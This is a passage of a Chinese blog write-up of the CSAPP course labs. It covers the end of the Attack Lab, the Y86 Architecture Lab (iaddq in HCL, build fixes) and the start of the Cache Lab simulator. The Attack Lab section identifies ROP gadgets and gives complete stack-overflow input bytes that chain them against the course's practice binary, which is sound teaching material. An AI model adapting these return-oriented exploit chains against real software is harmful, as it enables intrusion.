+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a7 &lt;addval_219&gt;:</span><br><span class="line">  <span class="number">4019</span>a7: <span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>     lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>ad: c3                    retq  </span><br><span class="line"></span><br><span class="line"><span class="number">00000000004019</span>a0 &lt;addval_273&gt;:</span><br><span class="line">  <span class="number">4019</span>a0: <span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3     lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>a6: c3                    retq</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>注意到函数<code>addval_219</code>中存在字节序列<code>58 90 c3</code>。其中<code>58</code>是<code>popq %rax</code>的机器表示，<code>90</code>是<code>nop</code>的机器表示，<code>c3</code>是<code>ret</code>的机器表示。这样的一小段字节序列可以用来将数据从栈上弹到寄存器<code>%rax</code>中。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4019</span>ab: <span class="number">58</span>                    popq %rax</span><br><span class="line"><span class="number">4019</span>ac: <span class="number">90</span>                    nop</span><br><span class="line"><span class="number">4019</span>ad: c3                    retq</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>同时，函数<code>addval_273</code>中存在字节序列<code>48 89 c7 c3</code>。其中<code>48 89 c7</code>就是<code>movq %rax, %rdi</code>的机器表示，<code>c3</code>是<code>ret</code>的机器表示。所以我们可以利用这个gadget将<code>%rax</code>中的数据拷贝到<code>%rdi</code>中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4019</span>a2: <span class="number">48</span> <span class="number">89</span> c7              movq %rax, %rdi</span><br><span class="line"><span class="number">4019</span>a5: c3                    retq</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>上述的两条<code>popq rax</code>与<code>movq %rax, %rdi</code> 之间的配合，间接构成了一条<code>popq %rdi</code>指令，这样我们就可以设置寄存器<code>%rdi</code>，完成目的。实际效果如下：<br>
+<img src="/2020/07/csapp-lab-writeup/rtarget_2_1.png" alt="img"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>综上所述，我们需要完成</p>
+<ul>
+<li>栈溢出跳转至<code>popq %rax</code></li>
+<li>跳转至<code>movq %rax, %rdi</code></li>
+<li>跳转至<code>touch2</code>函数（地址为<code>0x4017ec</code>）</li>
+</ul>
+<p>最终输入的数据如下</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>过关截图<br>
+<img src="/2020/07/csapp-lab-writeup/rtarget_2_2.png" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><strong>phase5</strong>
+<ul>
+<li>
+<p>在这一关中，主要会用到如下几个函数</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000401</span>a03 &lt;addval_190&gt;:</span><br><span class="line">  <span class="number">401</span>a03: <span class="number">8</span>d <span class="number">87</span> <span class="number">41</span> <span class="number">48</span> <span class="number">89</span> e0     lea    <span class="number">-0x1f76b7bf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">401</span>a09: c3                    retq</span><br><span class="line"><span class="number">00000000004019</span>d6 &lt;add_xy&gt;:</span><br><span class="line">  <span class="number">4019</span>d6: <span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">37</span>           lea    (%rdi,%rsi,<span class="number">1</span>),%rax</span><br><span class="line">  <span class="number">4019</span>da: c3                    retq</span><br><span class="line"><span class="number">00000000004019</span>a0 &lt;addval_273&gt;:</span><br><span class="line">  <span class="number">4019</span>a0: <span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3     lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>a6: c3                    retq</span><br></pre></td></tr></table></figure>
+<p>其中分别提取出可利用的gadgets</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">401</span>a06: <span class="number">48</span> <span class="number">89</span> e0              movq %rsp, %rax</span><br><span class="line"><span class="number">401</span>a09: c3                    retq</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>d8: <span class="number">04</span> <span class="number">37</span>                 add <span class="number">0x37</span>, %al</span><br><span class="line"><span class="number">4019</span>da: c3                    retq</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>a2: <span class="number">48</span> <span class="number">89</span> c7              movq %rax, %rdi</span><br><span class="line"><span class="number">4019</span>a5: c3                    retq</span><br></pre></td></tr></table></figure>
+<p>这些gadgets组合起来，可以获得指定偏移量的栈地址。如果将cookie字符串写入至此地址上，则可以达到 <strong>%rdi指向cookie字符串</strong> 这个目的，这样便可以通过当前关卡。</p>
+<p>使用效果如下<br>
+<img src="/2020/07/csapp-lab-writeup/rtaget_3_1.png" alt="img"></p>
+</li>
+<li>
+<p>最后的输入数据如下</p>
+<blockquote>
+<p>注意第13行只有7个字节，并非笔者的疏忽</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">d8 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+<p>过关截图<br>
+<img src="/2020/07/csapp-lab-writeup/rtarget_3_2.png" alt="img"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-Architecture-Lab">4. Architecture Lab</h2>
+<h3 id="1-Part-A">1) Part A</h3>
+<ul>
+<li>
+<p>这部分内容的工作目录为<code>arch-lab/sim/misc</code></p>
+</li>
+<li>
+<p>在part A中，我们要分别用<code>Y86</code>汇编（注意不是<code>x86</code>）来手动编写位于<code>example.c</code>中的三个函数，以熟悉<code>Y86</code>的基本语法。该部分实现较为简单，依照CSAPP上的代码照葫芦画瓢即可。</p>
+</li>
+<li>
+<p>其中，编译与运行<code>Y86</code>指令的shell脚本如下</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">./yas $*.ys &amp;&amp; ./yis $*.yo</span><br></pre></td></tr></table></figure>
+<p>执行效果如图所示<br>
+<img src="/2020/07/csapp-lab-writeup/y86_disp.png" alt="img"></p>
+</li>
+<li>
+<p><code>sum_list</code>函数的<code>Y86</code>汇编 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20A/sum.ys" target="_blank" rel="noopener">github</a></p>
+</li>
+<li>
+<p><code>rsum_list</code>函数的<code>Y86</code>汇编 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20A/rsum.ys" target="_blank" rel="noopener">github</a></p>
+<blockquote>
+<p>注意递归调用函数时，需保存特定的寄存器到栈上，以便调用者使用。</p>
+</blockquote>
+</li>
+<li>
+<p><code>copy_block</code>函数的<code>Y86</code>汇编 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20A/copy.ys" target="_blank" rel="noopener">github</a></p>
+</li>
+</ul>
+<h3 id="2-Part-B">2) Part B</h3>
+<ul>
+<li>
+<p>该部分内容主要是为SEQ处理器添加指令<code>iaddq</code>，所要修改的文件为<code>seq-full.hcl</code>，其工作目录为<code>arch-lab/sim/seq</code></p>
+</li>
+<li>
+<p>由于<code>iaddq</code>指令既与运算操作相关，又与立即数处理相关，故该指令的功能添加可以参考<code>seq-full.hcl</code>中的<code>IOPQ</code>以及<code>IIRMOVQ</code>来编写。<br>
+以下摘抄了修改过的内容，完整内容请进入<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20B/seq-full.hcl" target="_blank" rel="noopener">github</a>，所有更改均以中文注释的形式写入其中。</p>
+<blockquote>
+<p>注：编写HCL时，使用汇编高亮是个不错的选择。</p>
+</blockquote>
+  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># Instruction code for iaddq instruction</span><br><span class="line">wordsig IIADDQ  <span class="string">'I_IADDQ'</span></span><br><span class="line"></span><br><span class="line"># 将IIADDQ指令加入到合法指令集合中</span><br><span class="line">bool instr_valid = icode <span class="keyword">in</span></span><br><span class="line">&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">        IOPQ, IJXX, ICALL, <span class="keyword">IRET</span>, IPUSHQ, IPOPQ, IIADDQ &#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># IIADDQ指令 需要读入一个寄存器，因此要额外读取一个字节，故添加到该集合中</span><br><span class="line">bool need_regids =</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,</span><br><span class="line">        IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># IIADDQ指令 需要读入一个常数，因此添加到该集合中</span><br><span class="line">bool need_valC =</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">## IIADDQ需要读取右寄存器的值，因此加入到该集合中</span><br><span class="line"><span class="built_in">word</span> srcB = [</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, <span class="keyword">IRET</span> &#125; : RRSP<span class="comment">;</span></span><br><span class="line">  <span class="number">1</span> : RNONE<span class="comment">;  # Don't need register</span></span><br><span class="line">]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># 这里设置将结果写入IIADDQ指令的右寄存器中中</span><br><span class="line"><span class="built_in">word</span> dstE = [</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, <span class="keyword">IRET</span> &#125; : RRSP<span class="comment">;</span></span><br><span class="line">  <span class="number">1</span> : RNONE<span class="comment">;  # Don't write any register</span></span><br><span class="line">]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># IIADDQ 指令的左操作数为读入的常数项</span><br><span class="line"><span class="built_in">word</span> aluA = [</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IRRMOVQ, IOPQ &#125; : valA<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; ICALL, IPUSHQ &#125; : -<span class="number">8</span><span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; <span class="keyword">IRET</span>, IPOPQ &#125; : <span class="number">8</span><span class="comment">;</span></span><br><span class="line">  # Other instructions don<span class="string">'t need ALU</span></span><br><span class="line"><span class="string">];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># IIADDQ 指令的左操作数为读入的寄存器rB</span></span><br><span class="line"><span class="string">word aluB = [</span></span><br><span class="line"><span class="string">  icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span></span><br><span class="line"><span class="string">          IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span></span><br><span class="line"><span class="string">    # 一个很有意思的点：将立即数存到特定寄存器的操作，就是先运算立即数 + 0，再将结果存入寄存器</span></span><br><span class="line"><span class="string">  icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span></span><br><span class="line"><span class="string">  # Other instructions don'</span>t need ALU</span><br><span class="line">]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># IIADDQ可能需要设置条件位，与IOPQ类似</span><br><span class="line">bool set_cc = icode <span class="keyword">in</span> &#123; IOPQ, IIADDQ &#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>当指令添加完成后，执行以下操作</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成新的SEQ模拟器。如果make失败，可能需要修改makefile</span></span><br><span class="line">make clean &amp;&amp; make VERSION=full</span><br><span class="line"><span class="comment"># 可选操作，使用一个简单的例子测试iaddq指令</span></span><br><span class="line">./ssim -t ../y86-code/asumi.yo</span><br><span class="line"><span class="comment"># 可选操作，如果需要debug，则可以使用GUI形式的ssim来单步调试</span></span><br><span class="line">./ssim -g ../y86-code/asumi.yo</span><br><span class="line"><span class="comment"># 可选操作，使用微型测试集来测试除iaddq指令以外的其他指令。</span></span><br><span class="line"><span class="comment"># 这部分的目的主要有两点</span></span><br><span class="line"><span class="comment">#   1. 判断测试工具是否正常运行</span></span><br><span class="line"><span class="comment">#   2. 判断原先指令是否被用户无意间破坏</span></span><br><span class="line">(<span class="built_in">cd</span> ../y86-code; make testssim)</span><br><span class="line"><span class="comment"># 可选操作，使用大量测试集来测试除iaddq指令以外的其他指令</span></span><br><span class="line">(<span class="built_in">cd</span> ../ptest; make SIM=../seq/ssim)</span><br><span class="line"><span class="comment"># 使用大量测试集来测试iaddq指令</span></span><br><span class="line">(<span class="built_in">cd</span> ../ptest; make SIM=../seq/ssim TFLAGS=-i)</span><br></pre></td></tr></table></figure>
+<p><code>iaddq</code>指令测试成功的截图如下<br>
+<img src="/2020/07/csapp-lab-writeup/seq_test.png" alt="img"></p>
+</li>
+<li>
+<p>编译过程中可能会出现一些错误，例如未找到头文件<code>tk.h</code>、某个结构体中没有成员<code>result</code>、程序链接失败等等。其解决方法如下：</p>
+<ul>
+<li>
+<p>首先在执行<code>make</code>前，需要修改<code>makefile</code>中的部分内容</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始情况下 VERSION为std，如果只想生成full版本的ssim，可以直接修改VERSION</span></span><br><span class="line">VERSION=full</span><br><span class="line"><span class="comment"># GUIMODE情况下需要添加 -DUSE_INTERP_RESULT， 原因是tk中的某个结构体的某个成员已被弃用，</span></span><br><span class="line"><span class="comment"># 如需使用则必须添加宏定义USE_INTERP_RESULT</span></span><br><span class="line">GUIMODE=-DHAS_GUI -DUSE_INTERP_RESULT</span><br><span class="line"><span class="comment"># 修改使用的tk tcl版本，在每个参数后添加版本号。i.e. -ltk  =&gt;  -ltk8.6</span></span><br><span class="line">TKLIBS=-L/usr/lib -ltk8.6 -ltcl8.6</span><br><span class="line">TKINC=-isystem /usr/<span class="keyword">include</span>/tcl8.6</span><br><span class="line"></span><br><span class="line"><span class="comment"># ......</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>其次，将<code>ssim.c</code>文件中的第844、845行注释掉即可</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 第837行 */</span>   <span class="meta">#<span class="meta-keyword">ifdef</span> HAS_GUI</span></span><br><span class="line">                <span class="comment">/* ... */</span></span><br><span class="line"><span class="comment">/* 第844行 */</span>   <span class="comment">//extern int matherr();</span></span><br><span class="line"><span class="comment">/* 第845行 */</span>   <span class="comment">//int *tclDummyMathPtr = (int *) matherr;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-Part-C">3) Part C</h3>
+<ul>
+<li>
+<p>在当前部分中，我们需要修改<code>ncopy.ys</code>与<code>pipe-full.hcl</code>，以获得更高的执行效率</p>
+</li>
+<li>
+<p>当代码修改完成后，执行以下命令</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"><span class="comment">#   1. make用于生成测试用例与seq模拟器，-s 安静模式</span></span><br><span class="line"><span class="comment">#   2. correctness.pl使用更高级别的测试来测试ncopy.ys的正确性</span></span><br><span class="line"><span class="comment">#   3. ./benchmark.pl为运行速度评分</span></span><br><span class="line"><span class="comment">#   4. 最后判断ncopy的y86汇编文件大小是否不超过1k bytes（超过1k字节则ncopy.ys不合格）</span></span><br><span class="line">make VERSION=full -s &amp;&amp; ./correctness.pl &amp;&amp; ./benchmark.pl &amp;&amp; ../misc/yas ncopy.ys &amp;&amp; ./check-len.pl &lt; ncopy.yo</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>笔者所做的优化</p>
+<ul>
+<li>在<code>pipe-full.hcl</code>中实现<code>iaddq</code>指令，并替换<code>ncopy.ys</code>中所有可被<code>iaddq</code>替代的指令（包括其中一个操作数为立即数的<code>sub</code>指令）。
+<blockquote>
+<p>此时CPE等于12.70</p>
+</blockquote>
+</li>
+<li>将循环展开成<code>13、5、1</code>层数的三个不同循环。同时将 <strong>读取</strong> 与 <strong>存储</strong> 指令分开，减少 <strong>气泡</strong>(bubble)的插入或流水线的暂停。
+<blockquote>
+<p>此时CPE等于8.84，分数为33.1/60.0</p>
+</blockquote>
+</li>
+<li>由于笔者只是简单的将循环展开，并没有推敲更深层次的优化。故最终分数为33.1</li>
+</ul>
+</li>
+<li>
+<p><code>pipe-full.hcl</code>由于其添加流程与part B类似，故不再赘述，代码存于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20C/pipe-full.hcl" target="_blank" rel="noopener">github</a>。<br>
+<code>ncopy.ys</code>代码篇幅较大，存于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20C/ncopy.ys" target="_blank" rel="noopener">github</a>中</p>
+</li>
+</ul>
+<h2 id="5-Cache-Lab">5. Cache Lab</h2>
+<h3 id="1-Part-A-2">1) Part A</h3>
+<ul>
+<li>
+<p>在Part A中，我们需要仿造<code>csim-ref</code>，编写一个cache模拟器，该模拟器可以模拟在一系列的数据访问中cache的命中、不命中与牺牲行的情况，其中，需要牺牲行时，用LRU替换策略进行替换。</p>
+</li>
+<li>
+<p>偷了个小懒，直接把csim-ref逆向出了源代码 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/5.%20Cache%20Lab/csim.c" target="_blank" rel="noopener">github</a></p>
+</li>
+<li>
+<p>Cache主体的数据结构如下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">mem_addr_t</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cache_line_t</span>&#123;</span></span><br><span class="line">    <span class="keyword">mem_addr_t</span> tag;</span><br><span class="line">    <span class="keyword">int</span> valid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lru; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_line_t</span>* <span class="title">cache_set_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">cache_set_t</span>* <span class="keyword">cache_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">cache_t</span> cache;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>每次获取数据时，都需要修改该数据中的LRU。同时，如果该数据并没有存放于Cache中，则需要根据LRU来驱逐某条Cache_line。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">accessData</span><span class="params">(<span class="keyword">mem_addr_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> eviction_line;</span><br><span class="line">  <span class="comment">// 注意是无符号整数</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> eviction_lru = <span class="number">-1</span>;</span><br><span class="line">  eviction_line = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">mem_addr_t</span> tag = addr &gt;&gt; (s + b);</span><br><span class="line">  <span class="keyword">cache_set_t</span> cache_set = cache[(addr &gt;&gt; b) &amp; set_index_mask];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 所需数据的cache_line编号</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果把所有的cache_line全遍历完了还找不到所需的数据</span></span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= E )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 数据未命中</span></span><br><span class="line">      ++miss_count;</span><br><span class="line">      <span class="keyword">if</span> ( verbosity )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"miss "</span>);</span><br><span class="line">      <span class="comment">// 在一组cache_line中查找将被删除的cache_line</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> ia = <span class="number">0</span>; ia &lt; E; ++ia )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cache_set[ia].lru &lt; eviction_lru )</span><br><span class="line">        &#123;</span><br><span class="line">          eviction_line = ia;</span><br><span class="line">          eviction_lru = cache_set[ia].lru;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 如果当前这个要被删除的cache_line是valid</span></span><br><span class="line">      <span class="comment">// 即，这个要被替换数据的cache_line是一条之前读入的数据而不是空行</span></span><br><span class="line">      <span class="keyword">if</span> ( cache_set[eviction_line].valid )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 删除数+1</span></span><br><span class="line">        ++eviction_count;</span><br><span class="line">        <span class="keyword">if</span> ( verbosity )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"eviction "</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 模拟读入并覆盖数据到这个刚刚被删除（或本来是空行）的cache_line里</span></span><br><span class="line">      cache_set[eviction_line].valid = <span class="number">1</span>;</span><br><span class="line">      cache_set[eviction_line].tag = tag;</span><br><span class="line">      cache_set[eviction_line].lru = lru_counter++;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找cache中的数据</span></span><br><span class="line">    <span class="keyword">if</span> ( cache_set[i].tag == tag &amp;&amp; cache_set[i].valid )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果找到数据了，自然就hit_count++</span></span><br><span class="line">  ++hit_count;</span><br><span class="line">  <span class="keyword">if</span> ( verbosity )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hit "</span>);</span><br><span class="line">  cache_set[i].lru = lru_counter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-Part-B-2">2) Part B</h3>
+<ul>
+<li>在Part B中，我们需要编写一个实现矩阵转置的函数，并且使函数调用过程中对cache的不命中数miss尽可能少</li>
+<li>测试程序所使用的cache模拟器的参数为<code>-S 5 -E 1 -B 5</code>。即该cache为内含32个缓存行的<em>直接映射高速缓存</em>，其中每个缓存行可以存放32位数据，即8个int型数据。</li>
